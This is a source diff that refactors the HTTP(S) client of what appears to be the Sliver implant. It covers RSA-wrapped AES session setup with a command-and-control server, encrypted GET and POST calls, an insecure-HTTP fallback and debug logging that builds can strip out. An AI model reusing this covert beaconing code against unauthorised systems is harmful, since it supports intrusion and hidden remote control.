@@ -13,6 +13,8 @@ import (
 	"log"
 	"net"
 	"net/http"
+	"net/url"
+	"path"
 	"time"
 
 	pb "sliver/protobuf/sliver"
@@ -25,61 +27,59 @@ const (
 	defaultReqTimeout = time.Second * 60 // Long polling, we want a large timeout
 )
 
-func httpStartSession(address string) (*http.Client, error) {
-	var client *http.Client
-	var ID string
-	var key *AESKey
-	var err error
-
-	client = httpsClient()
-	secureOrigin := fmt.Sprintf("https://%s", address)
-	ID, key, err = httpSessionInit(secureOrigin, client)
+// HTTPStartSession - Attempts to start a session with a given address
+func HTTPStartSession(address string) (*SliverHTTPClient, error) {
+	var client *SliverHTTPClient
+	client = httpsClient(address)
+	err := client.SessionInit()
 	if err != nil {
-		client = httpClient() // Fallback to insecure HTTP
-		insecureOrigin := fmt.Sprintf("http://%s", address)
-		ID, key, err = httpSessionInit(insecureOrigin, client)
+		client = httpClient(address) // Fallback to insecure HTTP
+		err = client.SessionInit()
+		if err != nil {
+			return nil, err
+		}
 	}
-	if err != nil {
-		return nil, err
-	}
-
-	// {{if. Debug}}
-	log.Printf("Started new HTTP session with id %s/%v", ID, key)
-	// {{end}}
-
 	return client, nil
 }
 
-func httpSessionInit(origin string, client *http.Client) (string, *AESKey, error) {
+// SliverHTTPClient - Helper struct to keep everything together
+type SliverHTTPClient struct {
+	Origin     string
+	Client     *http.Client
+	SessionKey *AESKey
+	SessionID  string
+}
 
-	publicKey := httpGetPublicKey(origin, client)
+// SessionInit - Initailize the session
+func (s *SliverHTTPClient) SessionInit() error {
+	publicKey := s.getPublicKey()
 	if publicKey == nil {
 		// {{if .Debug}}
 		log.Printf("Invalid public key")
 		// {{end}}
-		return "", nil, errors.New("error")
+		return errors.New("error")
 	}
-	sessionKey := RandomAESKey()
-	httpSessionInit := &pb.HTTPSessionInit{
-		Key: sessionKey[:],
-	}
+	skey := RandomAESKey()
+	s.SessionKey = &skey
+	httpSessionInit := &pb.HTTPSessionInit{Key: skey[:]}
 	data, _ := proto.Marshal(httpSessionInit)
 	encryptedSessionInit, err := RSAEncrypt(data, publicKey)
 	if err != nil {
 		// {{if .Debug}}
 		log.Printf("RSA encrypt failed %v", err)
 		// {{end}}
-		return "", nil, errors.New("error")
+		return err
 	}
-
-	ID, err := httpGetSessionID(origin, client, sessionKey, encryptedSessionInit)
-
-	return ID, &sessionKey, nil
+	err = s.getSessionID(encryptedSessionInit)
+	if err != nil {
+		return err
+	}
+	return nil
 }
 
-func httpGetPublicKey(origin string, client *http.Client) *rsa.PublicKey {
-	req, _ := http.NewRequest("GET", fmt.Sprintf("%s/rsakey", origin), nil)
-	resp, err := client.Do(req)
+func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
+	req, _ := http.NewRequest("GET", fmt.Sprintf("%s/rsakey", s.Origin), nil)
+	resp, err := s.Client.Do(req)
 	if err != nil || resp.StatusCode != 200 {
 		// {{if. Debug}}
 		log.Printf("Failed to fetch server public key")
@@ -110,43 +110,96 @@ func httpGetPublicKey(origin string, client *http.Client) *rsa.PublicKey {
 	return nil
 }
 
-func httpGetSessionID(origin string, client *http.Client, sessionKey AESKey, sessionInit []byte) (string, error) {
-	reader := bytes.NewReader(sessionInit)
-	req, _ := http.NewRequest("POST", fmt.Sprintf("%s/start", origin), reader)
-	resp, err := client.Do(req)
-	if err != nil || resp.StatusCode != 200 {
-		// {{if. Debug}}
-		log.Printf("Failed to fetch session id")
-		// {{end}}
-		return "", nil
+// We do our own POST here because the server doesn't have the
+// session key yet.
+func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
+	reader := bytes.NewReader(sessionInit) // Already RSA encrypted
+	req, _ := http.NewRequest("POST", s.toURL("/start"), reader)
+	resp, err := s.Client.Do(req)
+	if err != nil {
+		return err
 	}
-	data, _ := ioutil.ReadAll(resp.Body)
-	sessionID, err := GCMDecrypt(sessionKey, data)
+	respData, _ := ioutil.ReadAll(resp.Body)
+	sessionID, err := GCMDecrypt(*s.SessionKey, respData)
+	if err != nil {
+		return err
+	}
+	s.SessionID = string(sessionID)
+	return nil
+}
+
+// Get - Perform an HTTP GET request
+func (s *SliverHTTPClient) Get(urlPath string) ([]byte, error) {
+	if s.SessionID == "" || s.SessionKey == nil {
+		return nil, errors.New("no session")
+	}
+	req, _ := http.NewRequest("GET", s.toURL(urlPath), nil)
+	resp, err := s.Client.Do(req)
 	if err != nil {
 		// {{if. Debug}}
-		log.Printf("Failed to decrypt session id")
+		log.Printf("[http] GET failed %v", err)
 		// {{end}}
-		return "", err
+		return nil, err
 	}
-	return string(sessionID), nil
+	if resp.StatusCode != 200 {
+		return nil, errors.New("Non-200 response code")
+	}
+	respData, _ := ioutil.ReadAll(resp.Body)
+	return GCMDecrypt(*s.SessionKey, respData)
 }
 
-func httpClient() *http.Client {
-	return &http.Client{
-		Timeout: defaultReqTimeout,
+// Post - Perform an HTTP POST request
+func (s *SliverHTTPClient) Post(urlPath string, data []byte) ([]byte, error) {
+	if s.SessionID == "" || s.SessionKey == nil {
+		return nil, errors.New("no session")
+	}
+	reqData, err := GCMEncrypt(*s.SessionKey, data)
+	reader := bytes.NewReader(reqData)
+	req, _ := http.NewRequest("POST", s.toURL(urlPath), reader)
+	resp, err := s.Client.Do(req)
+	if err != nil {
+		// {{if. Debug}}
+		log.Printf("[http] POST failed %v", err)
+		// {{end}}
+		return nil, err
+	}
+	if resp.StatusCode != 200 {
+		return nil, errors.New("Non-200 response code")
+	}
+	respData, _ := ioutil.ReadAll(resp.Body)
+	return GCMDecrypt(*s.SessionKey, respData)
+}
+
+func (s *SliverHTTPClient) toURL(urlPath string) string {
+	url, _ := url.Parse(s.Origin)
+	url.Path = path.Join(url.Path, urlPath)
+	return url.String()
+}
+
+// [ HTTP(S) Clients ] ------------------------------------------------------------
+
+func httpClient(address string) *SliverHTTPClient {
+	return &SliverHTTPClient{
+		Origin: fmt.Sprintf("http://%s", address),
+		Client: &http.Client{
+			Timeout: defaultReqTimeout,
+		},
 	}
 }
 
-func httpsClient() *http.Client {
+func httpsClient(address string) *SliverHTTPClient {
 	var netTransport = &http.Transport{
 		Dial: (&net.Dialer{
 			Timeout: defaultTimeout,
 		}).Dial,
 		TLSHandshakeTimeout: defaultTimeout,
 	}
-	return &http.Client{
-		Timeout:   defaultReqTimeout,
-		Transport: netTransport,
+	return &SliverHTTPClient{
+		Origin: fmt.Sprintf("https://%s", address),
+		Client: &http.Client{
+			Timeout:   defaultReqTimeout,
+			Transport: netTransport,
+		},
 	}
 }
 
